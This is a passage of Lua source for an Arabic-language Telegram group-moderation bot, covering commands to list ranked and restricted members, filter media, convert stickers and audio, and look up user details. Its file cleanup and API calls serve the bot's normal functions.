local username = DevBrAnD:get(BrAnD..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then 
text = "♰ ⌯ *لا يوجد منظفين*"
end
Dev_BrAnD(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end 
--     SoUrCe BrAnD     --
if BasicConstructor(msg) then
if text == "المنشئين" and ChCheck(msg) then 
local list = DevBrAnD:smembers(BrAnD..'BrAnD:Constructor:'..msg.chat_id_)
text = "♰ ⌯ قائمة المنشئين ↫ ⤈ \n⍆═════BR═════⍅\n"
for k,v in pairs(list) do
local username = DevBrAnD:get(BrAnD..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then 
text = "♰ ⌯ *لا يوجد منشئين*"
end
Dev_BrAnD(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end 
--     SoUrCe BrAnD     --
if BrAnDConstructor(msg) then
if text == "المنشئين الاساسيين" and ChCheck(msg) or text == "منشئين اساسيين" and ChCheck(msg) or text == "المنشئين الاساسين" and ChCheck(msg) then 
local list = DevBrAnD:smembers(BrAnD..'BrAnD:BasicConstructor:'..msg.chat_id_)
text = "♰ ⌯ قائمة المنشئين الاساسيين ↫ ⤈ \n⍆═════BR═════⍅\n"
for k,v in pairs(list) do
local username = DevBrAnD:get(BrAnD..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then 
text = "♰ ⌯ *لا يوجد منشئين اساسيين*"
end
Dev_BrAnD(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
end 
if text ==("المنشئ") and ChCheck(msg) or text ==("المالك") and ChCheck(msg) then
tdcli_function ({ID = "GetChANnElMembers",ChANnEl_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChANnElMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
Manager_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,dp) 
if dp.first_name_ == false then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ حساب المنشئ محذوف", 1, "md")
return false  
end
local UserName = (dp.username_ or "CXRCX")
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ منشئ المجموعه ↫ ["..dp.first_name_.."](T.me/"..UserName..")", 1, "md")  
end,nil)   
end
end
end,nil)   
end
--     SoUrCe BrAnD     --
if Admin(msg) then
if text == "المكتومين" and ChCheck(msg) then 
local list = DevBrAnD:smembers(BrAnD..'BrAnD:Muted:'..msg.chat_id_)
text = "♰ ⌯ قائمة المكتومين ↫ ⤈ \n⍆═════BR═════⍅\n"
for k,v in pairs(list) do
local username = DevBrAnD:get(BrAnD..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then 
text = "♰ ⌯ *لا يوجد مكتومين*"
end
Dev_BrAnD(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     SoUrCe BrAnD     --
if text == "المقيدين" and ChCheck(msg) then 
local list = DevBrAnD:smembers(BrAnD..'BrAnD:Tkeed:'..msg.chat_id_)
text = "♰ ⌯ قائمة المقيدين ↫ ⤈ \n⍆═════BR═════⍅\n"
for k,v in pairs(list) do
local username = DevBrAnD:get(BrAnD..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then
text = "♰ ⌯ *لا يوجد مقيدين*"
end
Dev_BrAnD(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     SoUrCe BrAnD     --
if text == "المحظورين" and ChCheck(msg) or text == "المحضورين" and ChCheck(msg) then 
local list = DevBrAnD:smembers(BrAnD..'BrAnD:Ban:'..msg.chat_id_)
text = "♰ ⌯ قائمة المحظورين ↫ ⤈ \n⍆═════BR═════⍅\n"
for k,v in pairs(list) do
local username = DevBrAnD:get(BrAnD..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then 
text = "♰ ⌯ *لا يوجد محظورين*"
end
Dev_BrAnD(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
if text == "قائمه المنع" and ChCheck(msg) then
local list = DevBrAnD:hkeys(BrAnD..'BrAnD:Filters:'..msg.chat_id_)
text = "♰ ⌯ قائمة المنع ↫ ⤈ \n⍆═════BR═════⍅\n"
for k, v in pairs(list) do
text = text..k..'~ ❨ '..v..' ❩\n'
end
if #list == 0 then
text = "♰ ⌯ لا توجد كلمات ممنوعه"
end
Dev_BrAnD(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
end 
--     SoUrCe BrAnD     --
if text == "المطايه" and ChCheck(msg) or text == "المطاية" and ChCheck(msg) then
local list = DevBrAnD:smembers(BrAnD..'User:Donky:'..msg.chat_id_)
text = "♰ ⌯ قائمة مطاية المجموعه 😹💔 ↫ ⤈ \n⍆═════BR═════⍅\n"
for k,v in pairs(list) do
local username = DevBrAnD:get(BrAnD..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then
text = "♰ ⌯ *لا يوجد مطايه كلها اوادم* 😹💔"
end
Dev_BrAnD(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
--     SoUrCe BrAnD     --
if SudoBot(msg) then
if text == "قائمه العام" and ChCheck(msg) or text == "المحظورين عام" and ChCheck(msg) or text == "المكتومين عام" and ChCheck(msg) or text == "↫ قائمه العام♰" and ChCheck(msg) then 
local BanAll = DevBrAnD:smembers(BrAnD..'BrAnD:BanAll:')
local MuteAll = DevBrAnD:smembers(BrAnD..'BrAnD:MuteAll:')
if #BanAll ~= 0 then 
text = "♰ ⌯ قائمة المحظورين عام ↫ ⤈ \n⍆═════BR═════⍅\n"
for k,v in pairs(BanAll) do
local username = DevBrAnD:get(BrAnD..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
else
text = ""
end
if #MuteAll ~= 0 then 
text = text.."♰ ⌯ قائمة المكتومين عام ↫ ⤈ \n⍆═════BR═════⍅\n"
for k,v in pairs(MuteAll) do
local username = DevBrAnD:get(BrAnD..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
else
text = text
end
if #BanAll ~= 0 or #MuteAll ~= 0 then 
text = text
else
text = "♰ ⌯ *لم يتم حظر او كتم اي عضو*"
end
Dev_BrAnD(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     SoUrCe BrAnD     --
if text == "المطورين" and ChCheck(msg) or text == "↫ المطورين♰" and ChCheck(msg) then 
local list = DevBrAnD:smembers(BrAnD..'BrAnD:SudoBot:')
text = "♰ ⌯ قائمة المطورين ↫ ⤈ \n⍆═════BR═════⍅\n"
for k,v in pairs(list) do
local sudouser = DevBrAnD:get(BrAnD..'BrAnD:Sudos'..v) 
local username = DevBrAnD:get(BrAnD..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."] ↬ Gps : "..(sudouser or 0).."\n"
else
text = text..""..k.."~ : `"..v.."` ↬ Gps : "..(sudouser or 0).."\n"
end end
if #list == 0 then
text = "♰ ⌯ *عذرا لم يتم رفع اي مطورين*"
end
Dev_BrAnD(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     SoUrCe BrAnD     --
if text == "المدراء العامين" and ChCheck(msg) then 
local list = DevBrAnD:smembers(BrAnD..'BrAnD:ManagerAll:')
text = "♰ ⌯ قائمة المدراء العامين ↫ ⤈ \n⍆═════BR═════⍅\n"
for k,v in pairs(list) do
local username = DevBrAnD:get(BrAnD..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then 
text = "♰ ⌯ *لا يوجد مدراء عامين*"
end
Dev_BrAnD(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
--     SoUrCe BrAnD     --
if text == "المميزين عام" and ChCheck(msg) or text == "المميزين العامين" and ChCheck(msg) then 
local list = DevBrAnD:smembers(BrAnD..'BrAnD:VipAll:')
text = "♰ ⌯ قائمة المميزين العام ↫ ⤈ \n⍆═════BR═════⍅\n"
for k,v in pairs(list) do
local username = DevBrAnD:get(BrAnD..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then 
text = "♰ ⌯ *لا يوجد مميزين عام*"
end
Dev_BrAnD(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     SoUrCe BrAnD     -- 
if text == "الادمنيه العامين" and ChCheck(msg) then 
local BrAnD =  'BrAnD:AdminAll:'
local list = DevBrAnD:smembers(BrAnD..BrAnD)
text = "♰ ⌯ قائمة الادمنيه العامين ↫ ⤈ \n⍆═════BR═════⍅\n"
for k,v in pairs(list) do
local username = DevBrAnD:get(BrAnD..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then
text = "♰ ⌯ *لا يوجد ادمنيه عامين*"
end
Dev_BrAnD(msg.chat_id_, msg.id_, 1, text, 1, "md")
end  
--     SoUrCe BrAnD     --
if text ==("رفع المنشئ") and ChCheck(msg) or text ==("رفع المنشئ") and ChCheck(msg) then 
tdcli_function ({ID = "GetChANnElMembers",ChANnEl_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChANnElMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
DevBrAnD:del(BrAnD..'BrAnD:BrAnDConstructor:'..msg.chat_id_)
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
Manager_id = admins[i].user_id_
end
end
tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,dp) 
if dp.first_name_ == false then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ حساب المنشئ محذوف", 1, "md")
return false  
end
local UserName = (dp.username_ or "CXRCX")
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم رفع منشئ المجموعه ↫ ["..dp.first_name_.."](T.me/"..UserName..")", 1, "md") 
DevBrAnD:sadd(BrAnD.."BrAnD:BrAnDConstructor:"..msg.chat_id_,dp.id_)
end,nil)   
end,nil)   
end
end 
end 
--     SoUrCe BrAnD     --
if Manager(msg) then
if text == 'منع' and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) then 
function filter_by_reply(extra, result, success) 
if result.content_.sticker_ then
local idsticker = result.content_.sticker_.sticker_.persistent_id_
DevBrAnD:sadd(BrAnD.."BrAnD:FilterSteckr"..msg.chat_id_,idsticker)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم منع الملصق بنجاح لن يتم ارساله مجددا', 1, 'md')
return false
end
if result.content_.ID == "MessagePhoto" then
local photo = result.content_.photo_.id_
DevBrAnD:sadd(BrAnD.."BrAnD:FilterPhoto"..msg.chat_id_,photo)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم منع الصوره بنجاح لن يتم ارسالها مجددا', 1, 'md')
return false
end
if result.content_.animation_ then
local idanimation = result.content_.animation_.animation_.persistent_id_
DevBrAnD:sadd(BrAnD.."BrAnD:FilterAnimation"..msg.chat_id_,idanimation)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم منع المتحركه بنجاح لن يتم ارسالها مجددا', 1, 'md')
return false
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,filter_by_reply) 
end
--     SoUrCe BrAnD     --
if text == 'الغاء منع' and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) then     
function unfilter_by_reply(extra, result, success) 
if result.content_.sticker_ then
local idsticker = result.content_.sticker_.sticker_.persistent_id_
DevBrAnD:srem(BrAnD.."BrAnD:FilterSteckr"..msg.chat_id_,idsticker)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم الغاء منع الملصق يمكنهم ارساله الان', 1, 'md')
return false
end
if result.content_.ID == "MessagePhoto" then
local photo = result.content_.photo_.id_
DevBrAnD:srem(BrAnD.."BrAnD:FilterPhoto"..msg.chat_id_,photo)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم الغاء منع الصوره يمكنهم ارسالها الان', 1, 'md')
return false
end
if result.content_.animation_.animation_ then
local idanimation = result.content_.animation_.animation_.persistent_id_
DevBrAnD:srem(BrAnD.."BrAnD:FilterAnimation"..msg.chat_id_,idanimation)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم الغاء منع المتحركه يمكنهم ارسالها الان', 1, 'md')
return false
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,unfilter_by_reply) 
end
end
--     SoUrCe BrAnD     --
if text and (text == "تفعيل تحويل الصيغ" or text == "تفعيل التحويل") and Manager(msg) and SoUrCeCh(msg) then
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تفعيل تحويل الصيغ'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:del(BrAnD..'BrAnD:Thwel:BrAnD'..msg.chat_id_) 
end
if text and (text == "تعطيل تحويل الصيغ" or text == "تعطيل التحويل") and Manager(msg) and SoUrCeCh(msg) then
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تعطيل تحويل الصيغ'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:set(BrAnD..'BrAnD:Thwel:BrAnD'..msg.chat_id_,true)  
end
if text == 'تحويل' and not DevBrAnD:get(BrAnD..'BrAnD:Thwel:BrAnD'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then 
function ThwelByReply(extra, result, success)
if result.content_.photo_ then 
local BrAnD = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.photo_.sizes_[1].photo_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..BrAnD.result.file_path,msg.sender_user_id_..'.png') 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.png')
os.execute('rm -rf ./'..msg.sender_user_id_..'.png') 
end   
if result.content_.sticker_ then 
local BrAnD = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.sticker_.sticker_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..BrAnD.result.file_path,msg.sender_user_id_..'.jpg') 
sendPhoto(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.jpg','♰ ⌯ تم تحويل الملصق الى صوره')     
os.execute('rm -rf ./'..msg.sender_user_id_..'.jpg') 
end
if result.content_.audio_ then 
local BrAnD = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.audio_.audio_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..BrAnD.result.file_path,msg.sender_user_id_..'.ogg') 
sendVoice(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.ogg',"♰ ⌯ تم تحويل الـMp3 الى بصمه")
os.execute('rm -rf ./'..msg.sender_user_id_..'.ogg') 
end   
if result.content_.voice_ then 
local BrAnD = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.voice_.voice_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..BrAnD.result.file_path,msg.sender_user_id_..'.mp3') 
sendAudio(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.mp3')  
os.execute('rm -rf ./'..msg.sender_user_id_..'.mp3') 
end
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ThwelByReply) 
end
end
--     SoUrCe BrAnD     --
if text ==("كشف") and msg.reply_to_message_id_ ~= 0 and ChCheck(msg) or text ==("ايدي") and msg.reply_to_message_id_ ~= 0 and ChCheck(msg) then 
function id_by_reply(extra, result, success) 
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local user_msgs = DevBrAnD:get(BrAnD..'BrAnD:UsersMsgs'..msg.chat_id_..':'..data.id_) or 0
local user_nkt = tonumber(DevBrAnD:get(BrAnD..'BrAnD:GamesNumber'..msg.chat_id_..data.id_) or 0)
if DevBrAnD:sismember(BrAnD..'BrAnD:BanAll:',result.sender_user_id_) then
Tkeed = 'محظور عام'
elseif DevBrAnD:sismember(BrAnD..'BrAnD:MuteAll:',result.sender_user_id_) then
Tkeed = 'مكتوم عام'
elseif DevBrAnD:sismember(BrAnD..'BrAnD:Ban:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'محظور'
elseif DevBrAnD:sismember(BrAnD..'BrAnD:Muted:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مكتوم'
elseif DevBrAnD:sismember(BrAnD..'BrAnD:Tkeed:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مقيد'
else
Tkeed = false
end
if Tkeed ~= false then
Tked = '\n♰ ⌯ القيود ↫ '..Tkeed
else 
Tked = '' 
end
if DevBrAnD:sismember(BrAnD..'BrAnD:SudoBot:',result.sender_user_id_) and SudoBot(msg) then
sudobot = '\n♰ ⌯ عدد الكروبات ↫ '..(DevBrAnD:get(BrAnD..'BrAnD:Sudos'..result.sender_user_id_) or 0)..'' 
else 
sudobot = '' 
end
if GetCustomTitle(result.sender_user_id_,msg.chat_id_) ~= false then
CustomTitle = '\n♰ ⌯ لقبه ↫ '..GetCustomTitle(result.sender_user_id_,msg.chat_id_)
else 
CustomTitle = '' 
end
if data.first_name_ == false then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1,'♰ ⌯ الحساب محذوف', 1, 'md')
return false  end
if data.username_ == false then
Text = '♰ ⌯ اسمه ↫ ['..CatchName(data.first_name_,20)..'](tg://user?id='..result.sender_user_id_..')\n♰ ⌯ ايديه ↫ ❨ `'..result.sender_user_id_..'` ❩\n♰ ⌯ رتبته ↫ '..IdRank(result.sender_user_id_, msg.chat_id_)..''..sudobot..'\n♰ ⌯ رسائله ↫ ❨ '..user_msgs..' ❩\n♰ ⌯ تفاعله ↫ '..formsgs(user_msgs)..''..CustomTitle..'\n♰ ⌯ نقاطه ↫ ❨ '..user_nkt..' ❩'..Tked
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1,'♰ ⌯ معرفه ↫ [@'..data.username_..']\n♰ ⌯ ايديه ↫ ❨ `'..result.sender_user_id_..'` ❩\n♰ ⌯ رتبته ↫ '..IdRank(result.sender_user_id_, msg.chat_id_)..''..sudobot..'\n♰ ⌯ رسائله ↫ ❨ '..user_msgs..' ❩\n♰ ⌯ تفاعله ↫ '..formsgs(user_msgs)..''..CustomTitle..'\n♰ ⌯ نقاطه ↫ ❨ '..user_nkt..' ❩'..Tked, 1, 'md')
end
end,nil)
end 
getMessage(msg.chat_id_, msg.reply_to_message_id_,id_by_reply) 
end
if text and text:match('^كشف @(.*)') and ChCheck(msg) or text and text:match('^ايدي @(.*)') and ChCheck(msg) then 
local username = text:match('^كشف @(.*)') or text:match('^ايدي @(.*)')
tdcli_function ({ID = "SearchPublicChat",username_ = username},function(extra, res, success) 
if res and res.message_ and res.message_ == "USERNAME_NOT_OCCUPIED" then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1,'♰ ⌯ *المعرف غير صحيح*', 1, 'md')
return false  end
if res.type_.ID == "ChANnElChatInfo" then 
if res.type_.ChANnEl_.is_supergroup_ == false then
local ch = 'قناة'
local chn = '♰ ⌯ نوع الحساب ↫ ❨ '..ch..' ❩\n♰ ⌯ الايدي ↫ ❨ `'..res.id_..'` ❩\n♰ ⌯ المعرف ↫ ❨ [@'..username..'] ❩\n♰ ⌯ الاسم ↫ ❨ ['..res.title_..'] ❩'
Dev_BrAnD(msg.chat_id_, msg.id_, 1,chn, 1, 'md')
else
local gr = 'مجموعه'
local grr = '♰ ⌯ نوع الحساب ↫ ❨ '..gr..' ❩\n♰ ⌯ الايدي ↫ ❨ '..res.id_..' ❩\n♰ ⌯ المعرف ↫ ❨ [@'..username..'] ❩\n♰ ⌯ الاسم ↫ ❨ ['..res.title_..'] ❩'
Dev_BrAnD(msg.chat_id_, msg.id_, 1,grr, 1, 'md')
end
return false  end
if res.id_ then  
tdcli_function ({ID = "GetUser",user_id_ = res.id_},function(arg,data) 
local user_msgs = DevBrAnD:get(BrAnD..'BrAnD:UsersMsgs'..msg.chat_id_..':'..res.id_) or 0
local user_nkt = tonumber(DevBrAnD:get(BrAnD..'BrAnD:GamesNumber'..msg.chat_id_..res.id_) or 0)
if DevBrAnD:sismember(BrAnD..'BrAnD:BanAll:',res.id_) then
Tkeed = 'محظور عام'
elseif DevBrAnD:sismember(BrAnD..'BrAnD:MuteAll:',res.id_) then
Tkeed = 'مكتوم عام'
elseif DevBrAnD:sismember(BrAnD..'BrAnD:Ban:'..msg.chat_id_,res.id_) then
Tkeed = 'محظور'
elseif DevBrAnD:sismember(BrAnD..'BrAnD:Muted:'..msg.chat_id_,res.id_) then
Tkeed = 'مكتوم'
elseif DevBrAnD:sismember(BrAnD..'BrAnD:Tkeed:'..msg.chat_id_,res.id_) then
Tkeed = 'مقيد'
else
Tkeed = false
end
if Tkeed ~= false then
Tked = '\n♰ ⌯ القيود ↫ '..Tkeed
else 
Tked = '' 
end
if DevBrAnD:sismember(BrAnD..'BrAnD:SudoBot:',res.id_) and SudoBot(msg) then
sudobot = '\n♰ ⌯ عدد الكروبات ↫ '..(DevBrAnD:get(BrAnD..'BrAnD:Sudos'..res.id_) or 0)..'' 
else 
sudobot = '' 
end
if GetCustomTitle(res.id_,msg.chat_id_) ~= false then
CustomTitle = '\n♰ ⌯ لقبه ↫ '..GetCustomTitle(res.id_,msg.chat_id_)
else 
CustomTitle = '' 
end
if data.first_name_ == false then
Dev_BrAnD(msg.chat_id_, msg.id_, 1,'♰ ⌯ الحساب محذوف', 1, 'md')
return false  end
Dev_BrAnD(msg.chat_id_, msg.id_, 1,'♰ ⌯ معرفه ↫ [@'..data.username_..']\n♰ ⌯ ايديه ↫ ❨ `'..res.id_..'` ❩\n♰ ⌯ رتبته ↫ '..IdRank(res.id_, msg.chat_id_)..''..sudobot..'\n♰ ⌯ رسائله ↫ ❨ '..user_msgs..' ❩\n♰ ⌯ تفاعله ↫ '..formsgs(user_msgs)..''..CustomTitle..'\n♰ ⌯ نقاطه ↫ ❨ '..user_nkt..' ❩'..Tked, 1, 'md')
end,nil)
end 
end,nil)
return false 
end
if text and text:match('كشف (%d+)') and ChCheck(msg) or text and text:match('ايدي (%d+)') and ChCheck(msg) then 
local iduser = text:match('كشف (%d+)') or text:match('ايدي (%d+)')  
tdcli_function ({ID = "GetUser",user_id_ = iduser},function(arg,data) 
if data.message_ == "User not found" then
Dev_BrAnD(msg.chat_id_, msg.id_, 1,'♰ ⌯ لم يتم التعرف على الحساب', 1, 'md')
return false  
end
local user_msgs = DevBrAnD:get(BrAnD..'BrAnD:UsersMsgs'..msg.chat_id_..':'..iduser) or 0
local user_nkt = tonumber(DevBrAnD:get(BrAnD..'BrAnD:GamesNumber'..msg.chat_id_..iduser) or 0)
if DevBrAnD:sismember(BrAnD..'BrAnD:BanAll:',iduser) then
Tkeed = 'محظور عام'
elseif DevBrAnD:sismember(BrAnD..'BrAnD:MuteAll:',iduser) then
Tkeed = 'مكتوم عام'
elseif DevBrAnD:sismember(BrAnD..'BrAnD:Ban:'..msg.chat_id_,iduser) then
Tkeed = 'محظور'
elseif DevBrAnD:sismember(BrAnD..'BrAnD:Muted:'..msg.chat_id_,iduser) then
Tkeed = 'مكتوم'
elseif DevBrAnD:sismember(BrAnD..'BrAnD:Tkeed:'..msg.chat_id_,iduser) then
Tkeed = 'مقيد'
else
Tkeed = false
end
if Tkeed ~= false then
Tked = '\n♰ ⌯ القيود ↫ '..Tkeed
else 
Tked = '' 
end
if DevBrAnD:sismember(BrAnD..'BrAnD:SudoBot:',iduser) and SudoBot(msg) then
sudobot = '\n♰ ⌯ عدد الكروبات ↫ '..(DevBrAnD:get(BrAnD..'BrAnD:Sudos'..iduser) or 0)..'' 
else 
sudobot = '' 
end
if GetCustomTitle(iduser,msg.chat_id_) ~= false then
CustomTitle = '\n♰ ⌯ لقبه ↫ '..GetCustomTitle(iduser,msg.chat_id_)
else 
CustomTitle = '' 
end
if data.first_name_ == false then
Dev_BrAnD(msg.chat_id_, msg.id_, 1,'♰ ⌯ الحساب محذوف', 1, 'md')
return false  end
if data.username_ == false then
Text = '♰ ⌯ اسمه ↫ ['..CatchName(data.first_name_,20)..'](tg://user?id='..iduser..')\n♰ ⌯ ايديه ↫ ❨ `'..iduser..'` ❩\n♰ ⌯ رتبته ↫ '..IdRank(data.id_, msg.chat_id_)..''..sudobot..'\n♰ ⌯ رسائله ↫ ❨ '..user_msgs..' ❩\n♰ ⌯ تفاعله ↫ '..formsgs(user_msgs)..''..CustomTitle..'\n♰ ⌯ نقاطه ↫ ❨ '..user_nkt..' ❩'..Tked
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1,'♰ ⌯ معرفه ↫ [@'..data.username_..']\n♰ ⌯ ايديه ↫ ❨ `'..iduser..'` ❩\n♰ ⌯ رتبته ↫ '..IdRank(data.id_, msg.chat_id_)..''..sudobot..'\n♰ ⌯ رسائله ↫ ❨ '..user_msgs..' ❩\n♰ ⌯ تفاعله ↫ '..formsgs(user_msgs)..''..CustomTitle..'\n♰ ⌯ نقاطه ↫ ❨ '..user_nkt..' ❩'..Tked, 1, 'md')
end
end,nil)
return false 
end 
--     SoUrCe BrAnD     --
if text == 'كشف القيود' and tonumber(msg.reply_to_message_id_) > 0 and Admin(msg) and ChCheck(msg) then 
function kshf_by_reply(extra, result, success)
if DevBrAnD:sismember(BrAnD..'BrAnD:Muted:'..msg.chat_id_,result.sender_user_id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevBrAnD:sismember(BrAnD..'BrAnD:Ban:'..msg.chat_id_,result.sender_user_id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevBrAnD:sismember(BrAnD..'BrAnD:BanAll:',result.sender_user_id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if DevBrAnD:sismember(BrAnD..'BrAnD:MuteAll:',result.sender_user_id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if DevBrAnD:sismember(BrAnD..'BrAnD:Tkeed:',result.sender_user_id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الحظر العام ↫ '..banall..'\n♰ ⌯ الكتم العام ↫ '..muteall..'\n♰ ⌯ الحظر ↫ '..banned..'\n♰ ⌯ الكتم ↫ '..muted..'\n♰ ⌯ التقيد ↫ '..tkeed..'', 1, 'md')  
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kshf_by_reply) 
end
if text and text:match('^كشف القيود @(.*)') and Admin(msg) and ChCheck(msg) then 
local username = text:match('^كشف القيود @(.*)') 
function kshf_by_username(extra, result, success)
if result.id_ then
if DevBrAnD:sismember(BrAnD..'BrAnD:Muted:'..msg.chat_id_,result.id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevBrAnD:sismember(BrAnD..'BrAnD:Ban:'..msg.chat_id_,result.id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevBrAnD:sismember(BrAnD..'BrAnD:BanAll:',result.id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if DevBrAnD:sismember(BrAnD..'BrAnD:MuteAll:',result.id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if DevBrAnD:sismember(BrAnD..'BrAnD:Tkeed:',result.id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الحظر العام ↫ '..banall..'\n♰ ⌯ الكتم العام ↫ '..muteall..'\n♰ ⌯ الحظر ↫ '..banned..'\n♰ ⌯ الكتم ↫ '..muted..'\n♰ ⌯ التقيد ↫ '..tkeed..'', 1, 'md')  
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ *المعرف غير صحيح*', 1, 'md')  
end
end
resolve_username(username,kshf_by_username) 
end
if text == 'رفع القيود' and tonumber(msg.reply_to_message_id_) > 0 and Admin(msg) and ChCheck(msg) then 
function unbanreply(extra, result, success) 
if tonumber(result.sender_user_id_) == tonumber(BrAnD) then  
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ انا البوت وليس لدي قيود', 1, 'md')  
return false  
end 
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم رفع قيوده")  
